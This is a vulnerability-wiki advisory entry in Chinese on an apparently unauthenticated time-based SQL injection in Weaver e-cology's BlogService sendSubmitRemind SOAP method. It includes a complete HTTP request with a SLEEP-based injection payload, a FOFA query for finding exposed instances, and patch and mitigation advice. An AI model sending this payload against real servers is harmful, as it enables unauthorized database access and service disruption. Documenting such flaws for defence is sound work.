---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "泛微e-cology BlogService sendSubmitRemind SQL注入"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未给版本；MySQL SLEEP表达式"
prerequisites: "声称未认证"
side_effects: "延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEE-Cology%20BlogService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"泛微-OA（e-cology）\""
id: "vw-c9aeef14598cd578ddf4a32c"
entity_id: "ve-c9aeef14598cd578ddf4a32c"
schema_version: "1"
---

# 泛微e-cology BlogService sendSubmitRemind SQL注入

## 条目说明

- 对象与具体问题：泛微e-cology；BlogService sendSubmitRemind SQL注入
- 版本、配置及部署条件：未给版本；MySQL SLEEP表达式
- 认证与权限前提：声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- SOAP in2延迟样本清楚，缺无延迟对照和原始响应
- 12万资产为指纹命中不是已确认易受攻击数，不应称漏洞影响资产规模
- HTTP/XML未围栏；在野利用及严重等级缺证据

## 操作风险

延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

泛微E-Cology BlogService 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

影响版本

泛微E-Cology

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 严重 |
| 影响面 | 高 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="泛微-OA（e-cology）"

POC/EXP：

```http
POST /services/BlogService HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
SOAPAction: 
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.blog.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:sendSubmitRemind>
         <!--type: string-->
         <web:in0>1</web:in0>
         <!--type: string-->
         <web:in1>2</web:in1>
         <!--type: string-->
         <web:in2>3' AND (SELECT 3686 FROM (SELECT(SLEEP(10)))KzVQ) AND 'WxlZ'='WxlZ</web:in2>
      </web:sendSubmitRemind>
   </soapenv:Body>
</soapenv:Envelope>
```


![image-20240824174203447](./.resource/泛微E-CologyBlogServiceSQL注入漏洞/media/image-20240824174203447.png)


涉及全网12w资产

![image-20240824174247865](./.resource/泛微E-CologyBlogServiceSQL注入漏洞/media/image-20240824174247865.png)


## 修复方案

1. 升级修复方案

   官方已发布升级补丁包，支持在线升级和离线补丁安装，可在参考链接https://www.weaver.com.cn/cs/securityDownload.html进行下载使用。
   
   临时缓解方案
   
   临时缓解方案可能无法完全阻止漏洞的利用，强烈建议尽快升级到修复版本。
   
   1使用WAF等安全设备进行防护。
   
   在不影响业务的情况下配置URL访问控制策略。
   
   限制访问来源地址，如非必要，不要将系统开放在互联网上。


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
